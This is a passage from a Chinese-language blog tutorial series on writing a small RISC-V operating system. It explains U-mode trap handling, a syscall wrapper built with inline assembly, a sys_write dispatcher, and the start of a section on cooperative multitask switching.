r_sstatus();</span></span><br><span class="line">    <span class="comment">//printf(&quot;sstatus:%x\n&quot;, sstatus);</span></span><br><span class="line">    <span class="type">int</span> ret = syscall(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="comment">// while (1)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     /* code */</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;ret:%d\n&quot;,ret);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> KernelStack[KERNEL_STACK_SIZE];</span><br><span class="line"><span class="type">uint8_t</span> UserStack[USER_STACK_SIZE]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __restore(pt_regs *next);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">tasks</span>;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">app_init_context</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">reg_t</span> user_sp = &amp;UserStack + USER_STACK_SIZE;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user_sp:%p\n&quot;</span>, user_sp);</span><br><span class="line"></span><br><span class="line">    <span class="type">reg_t</span> stvec = r_stvec();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stvec:%x\n&quot;</span>, stvec);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    trap_init();</span><br><span class="line"></span><br><span class="line">    <span class="type">reg_t</span> sstatus = r_sstatus();</span><br><span class="line">    <span class="comment">// 设置 sstatus 寄存器第8位即SPP位为0 表示为U模式</span></span><br><span class="line">    sstatus &amp;= (<span class="number">0U</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    w_sstatus(sstatus);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sstatus:%x\n&quot;</span>, sstatus);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    tasks.sepc = (<span class="type">reg_t</span>)testsys;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tasks sepc:%x\n&quot;</span>, tasks.sepc);</span><br><span class="line"></span><br><span class="line">    tasks.sstatus = sstatus;</span><br><span class="line"></span><br><span class="line">    tasks.sp = user_sp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pt_regs* cx_ptr = &amp;KernelStack[<span class="number">0</span>] + KERNEL_STACK_SIZE - <span class="keyword">sizeof</span>(pt_regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pt_regs: %d\n&quot;</span>,<span class="keyword">sizeof</span>(pt_regs));</span><br><span class="line">    cx_ptr-&gt;sepc = tasks.sepc;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cx_ptr sepc :%x\n&quot;</span>, cx_ptr-&gt;sepc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cx_ptr sepc adress:%x\n&quot;</span>, &amp;(cx_ptr-&gt;sepc));</span><br><span class="line">    cx_ptr-&gt;sstatus = tasks.sstatus;</span><br><span class="line">    cx_ptr-&gt;sp = tasks.sp;</span><br><span class="line">    <span class="comment">// *cx_ptr = tasks[0];</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cx_ptr adress:%x\n&quot;</span>, cx_ptr);</span><br><span class="line"></span><br><span class="line">    __restore(cx_ptr); </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>解释：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;context.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_STACK_SIZE (4096 * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_STACK_SIZE (4096 * 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_BASE_ADDRESS 0x80600000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>包含了必要的头文件</li>
<li>定义了用户堆栈和内核堆栈的大小 4k * 2 &#x3D; 8k</li>
<li>定义了应用程序的起始地址 <code>0x80600000</code></li>
</ul>
<p><strong>系统调用</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">syscall</span><span class="params">(<span class="type">size_t</span> id, <span class="type">reg_t</span> arg1, <span class="type">reg_t</span> arg2, <span class="type">reg_t</span> arg3)</span> &#123;</span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a7, %1\n\t&quot;</span>   <span class="comment">// 将系统调用号移动到 a7 寄存器</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a0, %2\n\t&quot;</span>   <span class="comment">// 将第一个参数移动到 a0 寄存器</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a1, %3\n\t&quot;</span>   <span class="comment">// 将第二个参数移动到 a1 寄存器</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a2, %4\n\t&quot;</span>   <span class="comment">// 将第三个参数移动到 a2 寄存器</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ecall\n\t&quot;</span>       <span class="comment">// 执行系统调用  </span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv %0, a0&quot;</span>       <span class="comment">// 将返回值移动到 &#x27;ret&#x27; 变量</span></span></span><br><span class="line"><span class="params">        : <span class="string">&quot;=r&quot;</span> (ret)</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;r&quot;</span> (id), <span class="string">&quot;r&quot;</span> (arg1), <span class="string">&quot;r&quot;</span> (arg2), <span class="string">&quot;r&quot;</span> (arg3)</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;a7&quot;</span>, <span class="string">&quot;a0&quot;</span>, <span class="string">&quot;a1&quot;</span>, <span class="string">&quot;a2&quot;</span>, <span class="string">&quot;memory&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>该函数执行一个系统调用，传递系统调用号和三个参数。</li>
<li>使用内联汇编将参数传递给适当的寄存器，并执行 <code>ecall</code> 指令。 — 执行<code>__alltrap</code>保存上下文 ，然后调用<code>handler</code> 函数处理<code>ecall </code>，最后恢复</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">testsys</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret = syscall(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;ret:%d\n&quot;, ret);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义了测试函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint8_t</span> KernelStack[KERNEL_STACK_SIZE];</span><br><span class="line"><span class="type">uint8_t</span> UserStack[USER_STACK_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __restore(pt_regs *next);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">tasks</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>定义了用户和内核堆栈</li>
<li>声明了外部的汇编函数<code>restore</code>，用于恢复上下文</li>
<li>定义一个 <code>pt_regs</code> 结构体实例 <code>tasks</code>，用于保存任务上下文。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">app_init_context</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">reg_t</span> user_sp = (<span class="type">reg_t</span>)(&amp;UserStack) + USER_STACK_SIZE;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user_sp:%p\n&quot;</span>, user_sp);</span><br><span class="line"></span><br><span class="line">    <span class="type">reg_t</span> stvec = r_stvec();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stvec:%x\n&quot;</span>, stvec);</span><br><span class="line"></span><br><span class="line">    trap_init();</span><br><span class="line"></span><br><span class="line">    <span class="type">reg_t</span> sstatus = r_sstatus();</span><br><span class="line">    <span class="comment">// 设置 sstatus 寄存器第 8 位（SPP 位）为 0，表示 U 模式</span></span><br><span class="line">    sstatus &amp;= ~(<span class="number">1U</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    w_sstatus(sstatus);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sstatus:%x\n&quot;</span>, sstatus);</span><br><span class="line"></span><br><span class="line">    tasks.sepc = (<span class="type">reg_t</span>)testsys;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tasks sepc:%x\n&quot;</span>, tasks.sepc);</span><br><span class="line"></span><br><span class="line">    tasks.sstatus = sstatus;</span><br><span class="line">    tasks.sp = user_sp;</span><br><span class="line"></span><br><span class="line">    pt_regs* cx_ptr = (pt_regs*)((<span class="type">uint8_t</span>*)&amp;KernelStack[<span class="number">0</span>] + KERNEL_STACK_SIZE - <span class="keyword">sizeof</span>(pt_regs));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pt_regs: %d\n&quot;</span>, <span class="keyword">sizeof</span>(pt_regs));</span><br><span class="line">    cx_ptr-&gt;sepc = tasks.sepc;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cx_ptr sepc: %x\n&quot;</span>, cx_ptr-&gt;sepc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cx_ptr sepc address: %p\n&quot;</span>, &amp;(cx_ptr-&gt;sepc));</span><br><span class="line">    cx_ptr-&gt;sstatus = tasks.sstatus;</span><br><span class="line">    cx_ptr-&gt;sp = tasks.sp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cx_ptr address: %p\n&quot;</span>, cx_ptr);</span><br><span class="line"></span><br><span class="line">    __restore(cx_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>目的：</strong>通过<code>app_init...</code>初始化用户态程序的上下文，并最后通过调用 <code>__restore(cx_ptr)</code> 将控制权移交给用户态程序， 最后在用户态程序中才是真的<code>ecall</code></p>
<ul>
<li><code>reg_t user_sp</code>初始化用户堆栈指针，并打印出来<ul>
<li>因为栈是从高地址往低地址向下增长的，所以用户栈的地址为<code>&amp;UserStack + USER_STACK_SIZE</code></li>
</ul>
</li>
<li>然后调用<code>trap_init</code>函数来设置<code>stvec</code>寄存器的值为<code>__alltraps</code>，这里告诉cpu发生trap时去哪里执行<ul>
<li><code>stvec</code>寄存器用于设置发生<code>trap</code>时，异常处理程序的地址。</li>
</ul>
</li>
<li>然后设置sstatus寄存器的SPP位为0。这是为啥呢？在上面对寄存器的介绍中提到“当执行一条SRET指令从trap处理程序返回时，如果SPP位为0，则特权级别被设置为U模式，如果SPP位为1，则特权级别被设置为S模式;”<strong>所以我们为了从S模式返回用户模式去执行testsys()中的代码，我们需要将SPP位设置为0。</strong></li>
<li>然后就是构造一段内核栈，设置<code>sstatus</code>、<code>sepc</code>、<code>sp</code>的值，这里由于下一阶段为用户模式，所以<code>sepc</code>会设置成用户态程序的地址（<code>testsys</code>），<code>sp</code>设置为用户栈的地址。</li>
<li>最后恢复上下文，返回用户态执行</li>
</ul>
<blockquote>
<p>OS&#x2F;os.h</p>
<p>还需要添加头文件以及函数声明</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __OS_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __OS_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;context.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;riscv.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* printk */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span>  <span class="title function_">printk</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s, ...)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">panic</span><span class="params">(<span class="type">char</span> *s)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">sbi_console_putchar</span><span class="params">(<span class="type">int</span> ch)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* batch.c */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">app_init_context</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* trap.c */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">trap_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __OS_H__ */</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;main.c</p>
<p>添加打印测试的U模式下函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//extern sbi_console_putchar(int ch);</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">os_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;hello!!!\n&quot;</span>);</span><br><span class="line">    app_init_context();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>OS&#x2F;Makefle</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">CROSS_COMPILE = riscv64-unknown-elf-</span><br><span class="line">CFLAGS = -nostdlib -fno-builtin -I/opt/riscv/riscv64-unknown-elf/<span class="keyword">include</span> -mcmodel=medany</span><br><span class="line"></span><br><span class="line"><span class="comment"># riscv64-unknown-elf-gcc 工具链可以同时编译汇编和 C 代码</span></span><br><span class="line">CC = $&#123;CROSS_COMPILE&#125;gcc </span><br><span class="line">OBJCOPY = $&#123;CROSS_COMPILE&#125;objcopy</span><br><span class="line">OBJDUMP = $&#123;CROSS_COMPILE&#125;objdump</span><br><span class="line"></span><br><span class="line">SRCS_ASM = \</span><br><span class="line">	entry.S \</span><br><span class="line">	kerneltrap \</span><br><span class="line"></span><br><span class="line">SRCS_C = \</span><br><span class="line">	sbi.c \</span><br><span class="line">	main.c \</span><br><span class="line">	printk.c \</span><br><span class="line">	batch.c \</span><br><span class="line">	trap.c \</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将源文件替换为 .o 文件</span></span><br><span class="line">OBJS = $(SRCS_ASM:.S=.o)</span><br><span class="line">OBJS += $(SRCS_C:.c=.o)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">os.elf: $&#123;OBJS&#125;</span></span><br><span class="line">	$&#123;CC&#125; $&#123;CFLAGS&#125; -T os.ld -Wl,-Map=os.map -o os.elf <span class="variable">$^</span></span><br><span class="line">	$&#123;OBJCOPY&#125; -O binary os.elf os.bin</span><br><span class="line"></span><br><span class="line">%.o : %.c</span><br><span class="line">	$&#123;CC&#125; $&#123;CFLAGS&#125; -c -o <span class="variable">$@</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line">%.o : %.S</span><br><span class="line">	$&#123;CC&#125; $&#123;CFLAGS&#125; -c -o <span class="variable">$@</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o *.bin *.elf</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p><img src="/2024/06/12/riscv-9-u%E6%A8%A1%E5%BC%8F%E7%9A%84trap%E6%9C%BA%E5%88%B6/image-20240613211217244.png" alt="image-20240613211217244"></p>
<p>可以看到 cause的值为8，查看<code>scause</code> 8表示 U模式的下的ecall</p>
<h2 id="trap-处理的总体流程"><a href="#trap-处理的总体流程" class="headerlink" title="trap 处理的总体流程"></a><code>trap</code> 处理的总体流程</h2><ol>
<li>首先通过 <code>__alltraps</code> 将 Trap 上下文保存在内核栈上，</li>
<li>然后跳转到编写的 <code>trap_handler</code> 函数完成 Trap 处理。</li>
<li>当 <code>trap_handler</code> 返回之后，使用 <code>__restore</code> 从保存在内核栈上的 Trap 上下文恢复寄存器。</li>
<li>最后通过一条 <code>sret</code> 指令回到应用程序执行。</li>
</ol>
<h2 id="本节添加函数逻辑-star"><a href="#本节添加函数逻辑-star" class="headerlink" title="本节添加函数逻辑:star:"></a>本节添加函数逻辑:star:</h2><ul>
<li><p><code>S模式：</code>首先在<code>app_init_context()</code>这个函数中，初始化用户态栈指针，初始化<code>trap</code>处理程序，初始化内核栈，最后通过<code>__restore(cx_ptr);</code>恢复到用户态（<code>testsys</code>）执行</p>
<ul>
<li>在<code>trap_init</code>中 初始化了 <code>__alltrap</code>汇编函数 这个函数用于保存上下文信息 以及调用 <code>trap_handler</code>对trap进行处理</li>
</ul>
</li>
<li><p><code>U模式：</code>用户态程序 <code>testsys</code>执行，函数调用了<code>syscall</code>函数</p>
</li>
<li><p><code>U模式：</code>在<code>syscall</code>函数，对寄存器进行操作，并且通过内联汇编的方式调用<code>ecall</code>，使得操作系统陷入了<code>trap</code></p>
</li>
<li><p><code>S模式：</code>在<code>trap</code>中，首先调用了<code>__alltrap</code>对上下文进行了保存，并调用<code>trap_handler</code>对trap进行处理（也是打印相关的寄存器信息）</p>
</li>
<li><p><code>S模式：</code>最后处理完 会调用<code>__restore</code>函数</p>
</li>
</ul>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-10-多任务调度</title>
    <url>/2024/06/14/riscv-10-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6/</url>
    <content><![CDATA[<h1 id="1-实现sys-write函数"><a href="#1-实现sys-write函数" class="headerlink" title="1.实现sys_write函数"></a>1.实现sys_write函数</h1><p><strong>本小节目标：</strong>实现通过<code>sys_write</code>函数在 用户态的程序调用串口输出打印</p>
<blockquote>
<p>OS&#x2F;app.c</p>
<p>删掉之前的<code>batch.c</code>，在<code>app.c</code>函数中实现用户态函数 <code>sys_write</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">syscall</span><span class="params">(<span class="type">size_t</span> id, <span class="type">reg_t</span> arg1, <span class="type">reg_t</span> arg2, <span class="type">reg_t</span> arg3)</span> &#123;</span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a7, %1\n\t&quot;</span>   <span class="comment">// Move syscall id to a7 register</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a0, %2\n\t&quot;</span>   <span class="comment">// Move args[0] to a1 register</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a1, %3\n\t&quot;</span>   <span class="comment">// Move args[1] to a2 register</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv a2, %4\n\t&quot;</span>   <span class="comment">// Move args[2] to a3 register</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ecall\n\t&quot;</span>       <span class="comment">// Perform syscall</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mv %0, a0&quot;</span>       <span class="comment">// Move return value to &#x27;ret&#x27; variable</span></span></span><br><span class="line"><span class="params">        : <span class="string">&quot;=r&quot;</span> (ret)</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;r&quot;</span> (id), <span class="string">&quot;r&quot;</span> (arg1), <span class="string">&quot;r&quot;</span> (arg2), <span class="string">&quot;r&quot;</span> (arg3)</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;a7&quot;</span>, <span class="string">&quot;a0&quot;</span>, <span class="string">&quot;a1&quot;</span>, <span class="string">&quot;a2&quot;</span>, <span class="string">&quot;memory&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">sys_wirte</span><span class="params">(<span class="type">size_t</span> fd, <span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    syscall(__NR_write,fd,buf, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>OS&#x2F;trap.c</p>
<p>trap_handler函数修改</p>
<p>对系统的调用号进行分发  8 —&gt; 表示 U模式下的ecall</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">trap_Context* <span class="title function_">trap_handler</span><span class="params">(trap_Context* cx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">reg_t</span> scause = r_scause();</span><br><span class="line">	<span class="keyword">switch</span> (scause)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">			__SYSCALL(cx-&gt;a7,cx-&gt;a0,cx-&gt;a1,cx-&gt;a2);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;undfined scause:%d\n&quot;</span>,scause);</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	cx-&gt;sepc += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;syscall.c 新建这个文件</p>
<p>其定义了 __SYSCALL函数的实现 从而调用printk进行输出 </p>
<p>syscall中对 call的id进行分发 如果是<code>__NR_write</code> 则代表 <code>__sys_write</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* syscall.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __SYSCALL(<span class="type">size_t</span> syscall_id, <span class="type">reg_t</span> arg1, <span class="type">reg_t</span> arg2, <span class="type">reg_t</span> arg3) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (syscall_id)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> __NR_write:</span><br><span class="line">            __sys_write(arg1, arg2, arg3);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            printk(<span class="string">&quot;Unsupported syscall id:%d\n&quot;</span>,syscall_id);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __sys_write(<span class="type">size_t</span> fd, <span class="type">const</span> <span class="type">char</span>* data, <span class="type">size_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(fd ==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        panic(<span class="string">&quot;Unsupported fd in sys_write!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;string.c</p>
<p><code>syscall(__NR_write, *fd*, *buf*, *len*);</code> 由于最后一个<code>len</code>需要计算字符串的长度，所以还要实现<code>strlen</code>函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* string.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;os.h&quot;</span></span></span><br><span class="line"><span class="comment">//计算字符串的长度 </span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ptr = (<span class="type">char</span> *)str;</span><br><span class="line">    <span class="keyword">while</span> (*ptr != EOS)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ptr - str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从存储区 src 复制 n 个字节到存储区 dest。</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ptr = dest;</span><br><span class="line">    <span class="keyword">while</span> (count--)</span><br><span class="line">    &#123;</span><br><span class="line">        *ptr++ = *((<span class="type">char</span> *)(src++));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/2024/06/14/riscv-10-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6/image-20240615221400398.png" alt="image-20240615221400398"></p>
<h1 id="2-协作式多任务调度"><a href="#2-协作式多任务调度" class="headerlink" title="2.协作式多任务调度"></a>2.协作式多任务调度</h1><h2 id="2-1switch介绍"><a href="#2-1switch介绍" class="headerlink" title="2.1switch介绍"></a>2.1switch介绍</h2><p><strong>协作式多任务调度</strong>：就是如果一个用户程序在做一些等待的事情的时候，比如等待外设响应而不需要占用cpu计算资源的时候可以让出cpu的使用权让下一个用户程序执行，当外设响应完毕后重新拿到cpu使用权继续执行，这大大的提高了cpu的执行效率。</p>
<p><strong>任务切换</strong>：从一个任务切换到另一个任务，</p>
<ul>
<li>同上章节一样，当从用户态切换到内核态，需要保存上下文</li>
<li>从一个任务切换到另一个任务也需要保存上下文，知道CPU重新拿回使用权恢复执行</li>
</ul>
<p><strong>实现多任务调度的关键</strong>：任务主动放弃CPU的执行权 ，在本章节中通过 调用用户态程序<code>sys_yield</code>实现（来告诉操作系统我要放弃CPU 的使用权了），然后操作系统进行任务切换。任务的切换是发生在<code>S</code>态的，任务在操作系统切换完毕后，同样通过<code>_restore</code>回到用户态执行程序，不过此时已经进行了任务切换，<strong>所以<code>_restore</code>回到的是切换后的任务</strong></p>
<p>所以，<strong>任务切换其实是来自两个不同应用在内核中的 <code>Trap</code> 控制流之间的切换。</strong>当一个应用 Trap 到 S 模式的操作系统内核中进行进一步处理的时候，我们可以设计一个函数来给Trap 控制流调用，从而进行任务切换。这个函数我们定义为<code>__switch</code></p>
<p>具体来说，调用 <code>__switch</code> 之后直到它返回前的这段时间，原 Trap 控制流 A 会先被暂停并被切换出去， CPU 转而运行另一个应用在内核中的 Trap 控制流 B 。然后在某个合适的时机，<strong>原 Trap 控制流 A 才会从某一条 Trap 控制流 C （很有可能不是它之前切换到的 B ）切换回来继续执行并最终返回。</strong><code>__switch</code> 函数和一个普通的函数之间的核心差别仅仅是它会 <strong>换栈</strong> 。</p>
<p><img src="/2024/06/14/riscv-10-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6/image-20240617152636754.png" alt="image-20240617152636754"></p>
<blockquote>
<p>以上参考：<a href="https://rcore-os.cn/rCore-Tutorial-Book-v3/chapter3/2task-switching.html">任务切换 - rCore-Tutorial-Book-v3 3.6.0-alpha.1 文档 (rcore-os.cn)</a></p>
</blockquote>
<p>每个任务都有自己的任务上下文，<strong>每个任务也有自己的内核栈和用户栈空间，所以我们首先需要为每个任务定义内核栈和用户栈</strong>。新建一个<code>task.c</code>文件:</p>
<blockquote>
<p>OS&#x2F;task.c</p>
<p>定义了内核栈空间 和 用户栈空间的大小</p>
</blockquote>
